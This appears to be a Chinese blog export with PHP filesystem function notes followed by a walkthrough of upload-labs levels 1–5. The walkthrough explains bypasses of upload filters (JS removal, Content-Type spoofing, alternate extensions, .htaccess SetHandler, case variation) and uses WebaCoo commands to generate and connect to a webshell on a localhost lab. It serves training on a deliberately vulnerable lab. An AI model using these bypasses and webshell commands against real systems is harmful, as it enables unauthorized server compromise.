<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、basename();	&#x2F;&#x2F; 返回路径中的文件名部分</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		&#x2F;&#x2F; 返回当前文件绝对路径</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 使用basename只返回文件名</span><br><span class="line">        echo basename(__FILE__);</span><br><span class="line">	</span><br><span class="line">2、dirname();	  &#x2F;&#x2F; 返回路径中的目录部分	</span><br><span class="line">	实例:</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 使用dirname返回路径中的目录部分，只显示到目录</span><br><span class="line">        echo dirname(__FILE__).&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        </span><br><span class="line">3、pathinfo();		&#x2F;&#x2F; 返回路径中的信息</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 以数组的形式输出</span><br><span class="line">        var_dump(pathinfo(__FILE__)).&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">      </span><br><span class="line">4、opendir();		&#x2F;&#x2F; 打开目录句柄，也可以叫目录资源</span><br><span class="line">5、deaddir();		&#x2F;&#x2F; 读取目录句柄的条目，返回目录中下一个文件的文件名</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123;</span><br><span class="line">            var_dump(readdir($dir));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">6、rewinddir();(了解)		&#x2F;&#x2F; 倒回目录句柄</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;2;$i++)&#123;</span><br><span class="line">            var_dump(readdir($dir));</span><br><span class="line">        &#125;</span><br><span class="line">        rewinddir($dir);</span><br><span class="line">        var_dump(readdir($dir));</span><br><span class="line"></span><br><span class="line">7、closedir();		&#x2F;&#x2F; 关闭目录句柄</span><br><span class="line">	实例：</span><br><span class="line">	&#x2F;&#x2F; 返回false</span><br><span class="line">		closedir($dir);</span><br><span class="line">		var_dump(readdir($dir));</span><br><span class="line">		</span><br><span class="line">8、mkdir();		&#x2F;&#x2F; 新建目录</span><br><span class="line">	实例：</span><br><span class="line">		&#x2F;&#x2F; 创建文件夹</span><br><span class="line">        var_dump(mkdir(&#39;file&#39;));</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 设置文件夹最高权限，0777代表linux中r-w-x，4-2-1</span><br><span class="line">        var_dump(mkdir(&#39;file&#39;,0777));</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 加上true可以创建多层目录</span><br><span class="line">        var_dump(mkdir(&#39;file1&#x2F;liux&#x2F;r-w-x&#39;,0777,true));</span><br><span class="line"></span><br><span class="line">9、rmdir();		&#x2F;&#x2F; 删除指定的空目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(rmdir(&#39;demo5&#x2F;file1&#39;));</span><br><span class="line">		</span><br><span class="line">10、scandir();	&#x2F;&#x2F; 列出指定路径中的文件和目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(scandir(&#39;..&#x2F;demo5&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="四、文件的基本操作"><a href="#四、文件的基本操作" class="headerlink" title="四、文件的基本操作"></a>四、文件的基本操作</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582958832868.png" alt="1582956505438"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582260055891.png" alt="1582958832868"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、fopen();		&#x2F;&#x2F; 打开文件或者URL</span><br><span class="line">2、fread();		&#x2F;&#x2F; 读取文件</span><br><span class="line">	实例：</span><br><span class="line">		header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        var_dump(fread($file,3));</span><br><span class="line">		</span><br><span class="line">3、fgets();		&#x2F;&#x2F; 从文件指针中读取一行</span><br><span class="line">	实例：</span><br><span class="line">		header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        var_dump(fgets($file,3));</span><br><span class="line"></span><br><span class="line">4、feof();		&#x2F;&#x2F; 测试文件指针是否到了文件结束位置</span><br><span class="line">	实例</span><br><span class="line">		$file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;10;$i++)&#123;</span><br><span class="line">            var_dump(fgets($file));</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump(feof($file));</span><br><span class="line">        </span><br><span class="line">5、fwrite();		&#x2F;&#x2F; 写入文件</span><br><span class="line">	实例:</span><br><span class="line">		$file&#x3D;fopen(&#39;test.txt&#39;,&#39;r+&#39;);</span><br><span class="line">		var_dump(fwrite($file,&#39;龙傲九天&#39;));</span><br><span class="line">		</span><br><span class="line">6、rewind();		&#x2F;&#x2F; 倒回文件目录指针位置</span><br><span class="line"></span><br><span class="line">7、flock();		&#x2F;&#x2F; 轻便的咨询文件锁定</span><br><span class="line">	实例：</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;a+&#39;);</span><br><span class="line">        &#x2F;&#x2F; 共享锁：LOCK_SH，独占锁：LOCK_EX，释放锁定：LOCK_UN，</span><br><span class="line">        &#x2F;&#x2F; 不希望flock()在锁定时堵塞：LOCK_NB,</span><br><span class="line">        if(flock($file,LOCK_EX))&#123;</span><br><span class="line">            &#x2F;&#x2F; sleep 延时</span><br><span class="line">            sleep(15);</span><br><span class="line">            fwrite($file,&#39;2.php&#39;);</span><br><span class="line">            flock($file,LOCK_UN);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;加锁失败&#39;;</span><br><span class="line">            </span><br><span class="line">8、ftruncate();		&#x2F;&#x2F; 将文件截断到给定的长度</span><br><span class="line"></span><br><span class="line">9、fclose();		&#x2F;&#x2F; 关闭一个已经打开的文件指针</span><br><span class="line">	实例</span><br><span class="line">		fclose($file);</span><br><span class="line"></span><br><span class="line">10、file();		&#x2F;&#x2F; 把整个文件读入一个数组中</span><br><span class="line"></span><br><span class="line">11、copy();		&#x2F;&#x2F; 拷贝文件</span><br><span class="line"></span><br><span class="line">12、unlink();	&#x2F;&#x2F; 删除文件</span><br><span class="line"></span><br><span class="line">13、file_get_contents();		&#x2F;&#x2F; 将整个文件读入一个字符串</span><br><span class="line">14、file_put_contents();		&#x2F;&#x2F; 将字符串写入文件中</span><br><span class="line">	实例：</span><br><span class="line">        header(&#39;Content-type;text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        &#x2F;&#x2F; 可以填入URL</span><br><span class="line">        var_dump(file_get_contents(&#39;test.txt&#39;));</span><br><span class="line">        &#x2F;&#x2F; 写入文件中并覆盖原来的内容</span><br><span class="line">        var_dump(file_put_contents(&#39;test.txt&#39;,&#39;www.baidu.com&#39;));</span><br><span class="line"></span><br><span class="line">15、rename();	&#x2F;&#x2F; 重命名一个文件或目录</span><br><span class="line"></span><br><span class="line">16、readfile();	&#x2F;&#x2F; 读入一个文件并写入到输出缓冲</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>upload-labs关卡</title>
    <url>/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/</url>
    <content><![CDATA[<h4 id="upload-labs第一关"><a href="#upload-labs第一关" class="headerlink" title="upload-labs第一关"></a>upload-labs第一关</h4><h5 id="upload-labs第一关有两种方法绕过"><a href="#upload-labs第一关有两种方法绕过" class="headerlink" title="upload-labs第一关有两种方法绕过"></a>upload-labs第一关有两种方法绕过</h5><p>第一种使用burpsuit</p>
<p>第二种F12将JS过滤源码删除</p>
<p>查看界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135006062.jpg" alt="image-20200407135006062"></p>
<p>上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135530806.jpg" alt="image-2020040713553080"></p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>判断了验证点在前端，查看JS判断代码，F12找到判断代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140025900.jpg" alt="image-20200407140025900"></p>
<p>把代码抠出来整理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传</p>
<p>现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140430474.jpg" alt="image-20200407140430474"></p>
<p>查看页面，返回空白图片说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140524961.jpg" alt="image-20200407140524961"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140616118.jpg" alt="image-20200407140616118"></p>
<p>使用第二种方法，删除检查源码进行上传</p>
<p>按F12打开源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141341729.jpg" alt="image-20200407141341729"></p>
<p>删除红线处的内容onsubmit</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141406254.jpg" alt="image-20200407141406254"></p>
<p>提交内容，页面返回空白说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141521547.jpg" alt="image-20200407141521547"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141622318.jpg" alt="image-20200407141622318"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第二关"><a href="#upload-labs第二关" class="headerlink" title="upload-labs第二关"></a>upload-labs第二关</h4><h5 id="查看代码"><a href="#查看代码" class="headerlink" title="查看代码"></a>查看代码</h5><p>这里只对Content-type进行了检查，只有当Content-type等于image/jpeg等格式才能上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line"></span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>使用burp抓包，更改Content-type的值</p>
<p>上传php文件Content-type的值是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure>

<p>需要将Content-Type中的值改为image/jpeg等可以上传的格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142209535.jpg" alt="image-20200407142209535"></p>
<p>查看页面，页面返回空白，说明上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142228744.jpg" alt="image-20200407142228744"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142309837.jpg" alt="image-20200407142309837"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第三关"><a href="#upload-labs第三关" class="headerlink" title="upload-labs第三关"></a>upload-labs第三关</h4><h5 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h5><p>可以看到服务器做了一个黑名单验证过滤了’.asp’,’.aspx’,’.php’,’.jsp’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。</p>
<h6 id="注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All"><a href="#注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All" class="headerlink" title="注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All"></a><em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>

<h5 id="配置文件http-conf"><a href="#配置文件http-conf" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407143520423.jpg" alt="image-20200407143520423"></p>
<p>这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀</p>
<p>使用一下其中一个，当然不止这些扩展名，还有很多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>上传php文件使用burp抓包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145002372.jpg" alt="image-20200407145002372"></p>
<p>将shell.php改为shell.phps</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145030124.jpg" alt="image-20200407145030124"></p>
<p>Forward放行，页面返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145105478.jpg" alt="image-20200407145105478"></p>
<p>右键选择复制图片地址在浏览器中打开，成功返回结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145158676.jpg" alt="image-20200407145158676"></p>
<h4 id="upload-labs第四关"><a href="#upload-labs第四关" class="headerlink" title="upload-labs第四关"></a>upload-labs第四关</h4><h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，黑名单里php、php3等这种后缀全部不允许上传，但并没有限制.htaccsess文件。故可以上传.htaccsess文件绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在桌面你新建一个one.txt，里面写入SetHandler application/x-httpd-php内容另存为.htaccess</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407151641458.jpg" alt="image-20200407151641458"></p>
<p>页面进行上传，会返回一个空图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720364221.png" alt="1585719758584"></p>
<p>复制图片链接，打开新的网址，会出现403，会显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719831410.png" alt="1585719740191"></p>
<p>这说明你文件已经上传了，但是你没有权限去访问他</p>
<p>在上传一个图片，图片包含phpinfo探针</p>
<p>使用文本编写php代码</p>
<?php 

​    phpinfo();

?>

<p>保存为1.jpg进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154104175.png" alt="image-20200407154104175"></p>
<p>复制图片地址在浏览器中打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154202446.png" alt="image-20200407154202446"></p>
<h4 id="upload-labs第五关"><a href="#upload-labs第五关" class="headerlink" title="upload-labs第五关"></a>upload-labs第五关</h4><h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，此处的黑名单比Pass-04多了.htaccess，所有不能通过.htaccsess进行绕过了。但此处代码没有将文件名统一转成小写，可以通过大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>用burp将后缀改为大写PHP即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154604250.png" alt="image-20200407154604250"></p>
<p>放行查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154622841.png" alt="image-20200407154622841"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154646284.png" alt="image-20200407154646284"></p>
<h4 id="WebaCoo上传Webshell"><a href="#WebaCoo上传Webshell" class="headerlink" title="WebaCoo上传Webshell"></a>WebaCoo上传Webshell</h4><p>WebaCoo生成Webshell：webacoo -g -o a.php</p>
<p>上传Webshell</p>
<p>连接Webshell：webacoo -t -u Webshell地址</p>
<h5 id="在kali中使用webacoo新建一个a-php文件"><a href="#在kali中使用webacoo新建一个a-php文件" class="headerlink" title="在kali中使用webacoo新建一个a.php文件"></a>在kali中使用webacoo新建一个a.php文件</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154837626.png" alt="image-20200407154837626"></p>
<p>将文件复制到本地文件中，将后缀名改为大小写结合的PhP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154923154.png" alt="image-20200407154923154"></p>
<p>上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788531529.png" alt="1585786501683"></p>
<p>复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令</p>
<p>注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot;</span><br></pre></td></tr></table></figure>

